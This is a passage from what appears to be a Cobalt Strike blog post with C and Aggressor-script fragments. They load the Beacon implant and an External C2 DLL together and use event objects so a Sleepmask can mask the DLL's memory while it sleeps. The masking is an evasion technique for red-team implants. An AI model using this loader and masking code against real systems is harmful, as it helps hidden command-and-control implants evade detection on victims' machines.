<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_906185" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_906185_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_906185" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="comments"># Pack the raw size of Beacon to simplify the loader </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="variable">$raw_size_of_beacon</code> <code class="plain">= </code><code class="functions">pack</code><code class="plain">(</code><code class="string">"I-"</code><code class="plain">, strlen(</code><code class="variable">$beacon</code><code class="plain">)); </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="comments"># Create the payload </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="variable">$payload</code> <code class="plain">= </code><code class="variable">$ldr</code> <code class="plain">. </code><code class="variable">$raw_size_of_beacon</code> <code class="plain">. </code><code class="variable">$beacon</code> <code class="plain">. </code><code class="variable">$extc2_dll</code><code class="plain">; </code></td></tr></tbody></table></div></div></div></div>


<p>This approach makes it possible for the extc2-loader to determine the base address of Beacon and use its length to find the base address of the raw External C2 DLL as well.&nbsp;</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_706413" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_706413_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_706413" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="comments">// Find the base address of the payload file </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="color1 bold">ULONG_PTR</code> <code class="plain">rawBeaconDllBaseAddress = FindBufferBaseAddress(); </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="comments">// Read the size of Beacon </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="plain">rawSizeOfBeacon = *(</code><code class="color1 bold">DWORD</code><code class="plain">*)rawBeaconDllBaseAddress; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="comments">// Find the start of the Beacon DLL </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="plain">rawBeaconDllBaseAddress += </code><code class="keyword bold">sizeof</code><code class="plain">(</code><code class="color1 bold">DWORD</code><code class="plain">); </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="comments">// Find the start of the External C2 DLL </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="color1 bold">ULONG_PTR</code> <code class="plain">rawExtC2DllBaseAddress = rawBeaconDllBaseAddress + rawSizeOfBeacon; </code></td></tr></tbody></table></div></div></div></div>


<p>Once it has located the base address of each DLL, it can then load them independently via consecutive calls to <code>ExternalC2LoaderLoadDll()</code>.&nbsp;&nbsp;As part of this process, it also tracks the memory and passes the information to Beacon via BUD.</p>



<p class="has-small-font-size"><strong><em>Note:</em></strong><em> To easily differentiate between these two regions of memory, we set the purpose field of Beacon’s region to <code>PURPOSE_BEACON_MEMORY</code> and the purpose of the External C2 DLL to an arbitrary value of 2000 to demonstrate using a custom <code>ALLOCATED_MEMORY_PURPOSE</code> value.&nbsp;This makes it possible to easily identify the region of memory in the Sleepmask.</em></p>



<p>To launch the capability, we call the External C2 DLL’s entry point to initialize the CRT and ensure that its startup routines have finished. We then resolve its exported <code>go()</code> function and pass it to <code>CreateThread()</code> along with a pointer to BUD’s custom data field. We then call Beacon’s entry point to do the same initialization, pass it a pointer to the <code>USER_DATA</code> structure and start Beacon.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_153901" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_153901_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_153901" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="plain">((DLLMAIN)extC2.EntryPoint)((</code><code class="color1 bold">HINSTANCE</code><code class="plain">)extC2.LoadedBaseAddress, DLL_PROCESS_ATTACH, NULL); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="plain">constexpr </code><code class="color1 bold">DWORD</code> <code class="plain">GO_HASH = CompileTimeHash(</code><code class="string">"go"</code><code class="plain">); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="color1 bold">ULONG_PTR</code> <code class="plain">extC2Go = ExtC2LoaderFindExportedFunctionByHash(extC2.LoadedBaseAddress, GO_HASH); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="plain">winApi.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extC2Go, &amp;userData.custom, 0, NULL); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="plain">winApi.Sleep(1000); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="plain">((DLLMAIN)beacon.EntryPoint)(0, DLL_BEACON_USER_DATA, &amp;userData);&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="plain">((DLLMAIN)beacon.EntryPoint)((</code><code class="color1 bold">HINSTANCE</code><code class="plain">)beacon.LoadedBaseAddress, DLL_PROCESS_ATTACH, NULL); </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="plain">((DLLMAIN)beacon.EntryPoint)((</code><code class="color1 bold">HINSTANCE</code><code class="plain">)loaderStart, 0x4, NULL); </code></td></tr></tbody></table></div></div></div></div>


<h3 class="wp-block-heading">Runtime Masking</h3>



<p>To reliably apply runtime masking, we had to find a way to synchronize the threads to ensure that they “Sleep” at the same time. It is safe to mask Beacon when execution reaches the Sleepmask as the thread is no longer executing the Beacon code. However, this is not true for the External C2 DLL which is either waiting for the External C2 server to send data or waiting for Beacon to send it.&nbsp;</p>



<p>To overcome this, we modified Raphael’s original External C2 example to use non-blocking calls when reading data from the pipe/socket. This “<em>non-blocking</em>” approach means the External C2 DLL can check if data is available instead of waiting for something to arrive. For example, the following <code>ReadFrameFromBeaconPipe()</code> function uses <code>PeekNamedPipe()</code> to check for data.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_290000" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_290000_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_290000" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="color1 bold">int</code> <code class="plain">ReadFrameFromBeaconPipe(</code><code class="color1 bold">HANDLE</code> <code class="plain">pipeHandle, </code><code class="color1 bold">char</code><code class="plain">* buffer) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">size = 0, temp = 0, total = 0;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">totalBytesAvailable = 0;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Check if there's data on the pipe</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(!PeekNamedPipe(pipeHandle, NULL, 0, NULL, &amp;totalBytesAvailable, NULL)) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">EXTC2PIPE_READ_ERROR;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(totalBytesAvailable == 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// If no data is available, return to avoid waiting</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">NO_DATA_AVAILABLE;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Read the length of the buffer</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(!ReadFile(pipeHandle, (</code><code class="color1 bold">char</code><code class="plain">*)&amp;size, 4, &amp;temp, NULL)) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">EXTC2PIPE_READ_ERROR;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Read the buffer</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">while</code> <code class="plain">(total &lt; size) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(!ReadFile(pipeHandle, buffer + total, size - total, &amp;temp, NULL)) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>22</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">EXTC2PIPE_READ_ERROR;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>23</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>24</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">total += temp;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>25</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>26</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>27</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">size;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>28</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div></div></div></div>


<p>The extc2-loader also creates four anonymous event objects. A handle to each event is then saved to BUD’s custom data field and passed to the External C2 DLL’s <code>go()</code> function when the thread is created. This makes it possible to retrieve the same information from within the Sleepmask via <code>BeaconGetCustomUserData()</code>.</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_277951" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_277951_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_277951" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="plain">((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2Init = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="keyword bold">if</code> <code class="plain">(((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2Init == NULL) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"[*] Failed to create event. Exiting...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">NULL;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="plain">((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2StopEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="keyword bold">if</code> <code class="plain">(((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2StopEvent == NULL) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"[*] Failed to create event. Exiting...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">NULL;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="plain">((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2SleepEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="keyword bold">if</code> <code class="plain">(((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2SleepEvent == NULL) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"[*] Failed to create event. Exiting...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">NULL;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="plain">((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2ContinueEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="keyword bold">if</code> <code class="plain">(((PEXTC2_SYNC_INFO)userData.custom)-&gt;ExtC2ContinueEvent == NULL) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PRINT(</code><code class="string">"[*] Failed to create event. Exiting...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code> <code class="plain">NULL;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content"><code class="plain">PRINT(</code><code class="string">"[*] Created event objects\n"</code><code class="plain">);</code></td></tr></tbody></table></div></div></div></div>


<p>&nbsp;The purpose of each of these events has been described below:&nbsp;</p>



<ul class="wp-block-list">
<li><code>ExtC2InitEvent</code> – used by Sleepmask-VS to check whether the External C2 DLL is operational.&nbsp;</li>



<li><code>ExtC2StopEvent</code> – used by Sleepmask-VS to indicate when the External C2 DLL should wait.&nbsp;</li>



<li><code>ExtC2SleepEvent</code> – used by the External C2 DLL to indicate when it is waiting.&nbsp;</li>



<li><code>ExtC2ContinueEvent</code> – used by Sleepmask-VS to indicate that the External C2 DLL can continue execution.&nbsp;</li>
</ul>



<p>These events are then used as part of the External C2 DLL’s busy loop to:&nbsp;</p>



<ul class="wp-block-list">
<li>Check whether Sleepmask-VS has set the <code>ExtC2StopEvent</code>.&nbsp;</li>



<li>Signal that the External C2 DLL’s thread is waiting (<code>ExtC2SleepEvent</code>).&nbsp;</li>



<li>Wait for Sleepmask-VS to signal the <code>ExtC2ContinueEvent</code>.&nbsp;</li>
</ul>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_268383" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_268383_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_268383" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="keyword bold">while</code> <code class="plain">(TRUE) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">/**</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* Check whether the Sleepmask has signaled the stop event.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* If the stop event is not signaled, continue immediately... </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">*/</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(WaitForSingleObject(localExtC2Info.ExtC2StopEvent, 0) == WAIT_OBJECT_0) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">/**</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* Let the Sleepmask know this thread is sleeping and</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* wait for the Sleepmask to signal the Continue event.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* Note: This allows the Sleepmask to mask the External C2 Dll</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">*/</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">SignalObjectAndWait(localExtC2Info.ExtC2SleepEvent, localExtC2Info.ExtC2ContinueEvent, INFINITE, FALSE);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div></div></div></div>


<p>This approach puts Sleepmask-VS in the driving seat. It can mask Beacon and then use the event objects created by the loader to synchronize the threads. In the below example, Sleepmask-VS:&nbsp;</p>



<ul class="wp-block-list">
<li>Sets <code>ExtC2StopEvent</code> to instruct the External C2 DLL to wait.</li>



<li>Waits for the External C2 DLL to signal that it has entered a waiting state (<code>ExtC2SleepEvent</code>).&nbsp;</li>



<li>Masks the External C2 DLL’s PE sections.&nbsp;</li>



<li>Sleeps for three seconds.&nbsp;</li>



<li>Unmasks the External C2 DLL’s PE sections.</li>



<li>Signals <code>ExtC2ContinueEvent</code> to let the External C2 DLL continue execution.</li>
</ul>


